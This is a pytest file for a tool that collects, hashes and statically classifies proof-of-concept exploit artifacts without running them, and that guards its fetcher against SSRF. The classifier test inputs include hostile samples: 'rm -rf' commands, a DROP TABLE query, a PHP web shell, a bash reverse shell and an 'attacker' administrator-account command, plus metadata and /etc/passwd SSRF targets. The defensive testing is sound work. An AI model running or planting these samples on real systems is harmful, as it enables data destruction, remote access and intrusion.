"""PoC artifact collector: static safety classification, SSRF guard, and the
download -> hash -> inspect -> classify -> store pipeline.

Crucially, these tests assert the *collector never executes* an artifact: it
only downloads, hashes, and pattern-matches, leaving every record UNVERIFIED.
"""

from __future__ import annotations

import httpx

from app.core.db import SessionLocal
from app.models.enums import PoCMaturity, SafetyClass, VerificationStatus
from app.models.poc import PoC
from app.services import poc_collector
from app.services.poc_collector import FetchResult, static_inspect

# A public IP literal: passes the SSRF guard (not private/loopback/etc.) without
# real DNS, so a MockTransport can stand in for the network.
PUB = "93.184.216.34"


# --------------------------------------------------------------- static_inspect
def test_static_inspect_flags_destructive():
    insp = static_inspect("#!/bin/bash\nrm -rf /var/www/html\n", "x.sh")
    assert insp.safety_class is SafetyClass.DESTRUCTIVE
    assert insp.language == "shell"
    assert any("rm -rf" in m for m in insp.markers)


def test_static_inspect_flags_destructive_sql():
    insp = static_inspect("<?php $db->query('DROP TABLE wp_users'); ?>")
    assert insp.safety_class is SafetyClass.DESTRUCTIVE
    assert insp.language == "php"


def test_static_inspect_flags_intrusive_rce():
    code = "<?php system($_GET['cmd']); ?>"
    insp = static_inspect(code, "shell.php")
    assert insp.safety_class is SafetyClass.INTRUSIVE
    assert insp.language == "php"
    assert any("code exec" in m for m in insp.markers)


def test_static_inspect_flags_intrusive_reverse_shell():
    insp = static_inspect("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "rev.sh")
    assert insp.safety_class is SafetyClass.INTRUSIVE


def test_static_inspect_flags_intrusive_user_creation():
    insp = static_inspect("wp user create attacker a@b.c --role=administrator", "poc.sh")
    assert insp.safety_class is SafetyClass.INTRUSIVE


def test_static_inspect_active_benign_http_probe():
    code = "import requests\nr = requests.get('https://site/wp-json/wp/v2/users')\n"
    insp = static_inspect(code, "probe.py")
    # Has an http client + rest discovery but no exec/destructive markers.
    assert insp.safety_class is SafetyClass.ACTIVE_BENIGN
    assert insp.language == "python"


def test_static_inspect_benign_check_version_probe():
    insp = static_inspect("GET /wp-content/plugins/foo/readme.txt -> version 1.2.3")
    assert insp.safety_class is SafetyClass.BENIGN_CHECK


def test_static_inspect_unknown_for_prose():
    insp = static_inspect("This advisory describes a stored XSS in the widget title field.")
    assert insp.safety_class is SafetyClass.UNKNOWN
    assert insp.markers == []


def test_static_inspect_worst_class_wins():
    # Contains both an http probe (benign) and rm -rf (destructive).
    code = "import requests\nrequests.get('http://x')\nimport os\nos.system('rm -rf /')\n"
    insp = static_inspect(code, "mixed.py")
    assert insp.safety_class is SafetyClass.DESTRUCTIVE


# --------------------------------------------------------------- SSRF guard
def test_fetch_public_blocks_loopback():
    r = poc_collector.fetch_public("http://127.0.0.1/poc.py")
    assert r.data is None
    assert "non-public" in r.error


def test_fetch_public_blocks_private_range():
    r = poc_collector.fetch_public("http://10.0.0.5/poc.py")
    assert r.data is None
    assert "non-public" in r.error


def test_fetch_public_blocks_link_local_metadata():
    r = poc_collector.fetch_public("http://169.254.169.254/latest/meta-data/")
    assert r.data is None
    assert "non-public" in r.error


def test_fetch_public_rejects_non_http_scheme():
    r = poc_collector.fetch_public("file:///etc/passwd")
    assert r.data is None
    assert "scheme" in r.error


def test_fetch_public_streams_and_caps_body(monkeypatch):
    monkeypatch.setattr(poc_collector, "MAX_POC_BYTES", 8)

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200, content=b"0123456789abcdef", headers={"content-type": "text/plain"}
        )

    monkeypatch.setattr(poc_collector, "_TEST_TRANSPORT", httpx.MockTransport(handler))
    r = poc_collector.fetch_public(f"http://{PUB}/poc.txt")
    assert r.error == ""
    assert r.data == b"01234567"  # capped at MAX_POC_BYTES
    assert r.truncated is True


def test_fetch_public_follows_in_scope_redirect(monkeypatch):
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/start":
            return httpx.Response(302, headers={"location": f"http://{PUB}/final"})
        return httpx.Response(200, content=b"final-body")

    monkeypatch.setattr(poc_collector, "_TEST_TRANSPORT", httpx.MockTransport(handler))
    r = poc_collector.fetch_public(f"http://{PUB}/start")
    assert r.error == ""
    assert r.data == b"final-body"
    assert r.final_url.endswith("/final")


def test_fetch_public_blocks_redirect_to_loopback(monkeypatch):
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(302, headers={"location": "http://127.0.0.1/secret"})

    monkeypatch.setattr(poc_collector, "_TEST_TRANSPORT", httpx.MockTransport(handler))
    r = poc_collector.fetch_public(f"http://{PUB}/start")
    assert r.data is None
    assert "redirect blocked" in r.error


# --------------------------------------------------------------- collect()
def _make_poc(db, url="https://example.test/poc.py") -> PoC:
    poc = PoC(poc_code="POC-TEST-00001", title="t", source_url=url)
    db.add(poc)
    db.flush()
    return poc


def test_collect_downloads_hashes_classifies_and_never_executes(tmp_path, monkeypatch):
    monkeypatch.setattr(poc_collector, "DATA_DIR", str(tmp_path))
    body = b"<?php system($_GET['c']); ?>"

    def fake_fetch(url):
        return FetchResult(data=body, content_type="text/x-php", final_url=url, truncated=False)

    db = SessionLocal()
    try:
        poc = _make_poc(db)
        result = poc_collector.collect(db, poc, fetcher=fake_fetch)

        import hashlib

        assert result["status"] == "collected"
        assert result["sha256"] == hashlib.sha256(body).hexdigest()
        assert result["executed"] is False
        # Classified intrusive (RCE), stored, but NOT verified.
        assert poc.safety_classification == SafetyClass.INTRUSIVE.value
        assert poc.maturity == PoCMaturity.STATIC_CHECKED.value
        assert poc.verification_status == VerificationStatus.UNVERIFIED.value
        assert poc.artifact_sha256 == result["sha256"]
        assert poc.artifact_ref.startswith("file://")
        # The artifact bytes were actually persisted and round-trip.
        loaded = poc_collector.load_artifact(poc)
        assert loaded is not None and loaded[0] == body
        # Collection outcome is recorded on the PoC for the audit trail.
        assert poc.test_result["collect"]["sha256"] == result["sha256"]
    finally:
        db.close()


def test_collect_handles_fetch_failure_without_marking_verified(monkeypatch):
    def fake_fetch(url):
        return FetchResult(error="HTTP 404")

    db = SessionLocal()
    try:
        poc = _make_poc(db)
        result = poc_collector.collect(db, poc, fetcher=fake_fetch)
        assert result["status"] == "fetch_failed"
        assert poc.artifact_ref == ""
        assert poc.verification_status == VerificationStatus.UNVERIFIED.value
    finally:
        db.close()


def test_collect_no_source_url():
    db = SessionLocal()
    try:
        poc = PoC(poc_code="POC-TEST-00002", title="t", source_url="")
        db.add(poc)
        db.flush()
        result = poc_collector.collect(db, poc, fetcher=lambda u: FetchResult(data=b"x"))
        assert result["status"] == "no_source_url"
    finally:
        db.close()


# --------------------------------------------------------------- API
def test_collect_api_endpoint_and_artifact_download(client, admin_headers, tmp_path, monkeypatch):
    monkeypatch.setattr(poc_collector, "DATA_DIR", str(tmp_path))
    body = b"import requests\nrequests.get('https://t/wp-json/wp/v2/users')\n"
    monkeypatch.setattr(
        poc_collector,
        "fetch_public",
        lambda url: FetchResult(data=body, content_type="text/x-python", final_url=url),
    )

    created = client.post(
        "/pocs",
        headers=admin_headers,
        json={"title": "probe", "source_url": "https://example.test/probe.py"},
    )
    assert created.status_code == 201, created.text
    poc_id = created.json()["id"]

    r = client.post(f"/pocs/{poc_id}/collect", headers=admin_headers)
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["status"] == "collected"
    assert out["executed"] is False
    assert out["safety_classification"] == SafetyClass.ACTIVE_BENIGN.value

    # The PoC record now exposes the artifact hash + ref and stays UNVERIFIED.
    got = client.get(f"/pocs/{poc_id}", headers=admin_headers).json()
    assert got["artifact_sha256"] == out["sha256"]
    assert got["verification_status"] == VerificationStatus.UNVERIFIED.value

    # The stored artifact downloads as a plain-text attachment.
    dl = client.get(f"/pocs/{poc_id}/artifact", headers=admin_headers)
    assert dl.status_code == 200
    assert dl.content == body
    assert dl.headers["content-type"].startswith("text/plain")
    assert "attachment" in dl.headers["content-disposition"]
    assert dl.headers["x-content-type-options"] == "nosniff"


def test_collect_batch_api_only_uncollected(client, admin_headers, tmp_path, monkeypatch):
    monkeypatch.setattr(poc_collector, "DATA_DIR", str(tmp_path))
    monkeypatch.setattr(
        poc_collector,
        "fetch_public",
        lambda url: FetchResult(data=b"readme.txt version 1.0", final_url=url),
    )
    for i in range(3):
        client.post(
            "/pocs",
            headers=admin_headers,
            json={"title": f"p{i}", "source_url": f"https://example.test/p{i}.txt"},
        )
    r = client.post("/pocs/collect", headers=admin_headers, json={"only_uncollected": True})
    assert r.status_code == 200, r.text
    assert r.json()["collected"] == 3
    # A second batch finds nothing left uncollected.
    r2 = client.post("/pocs/collect", headers=admin_headers, json={"only_uncollected": True})
    assert r2.json()["requested"] == 0
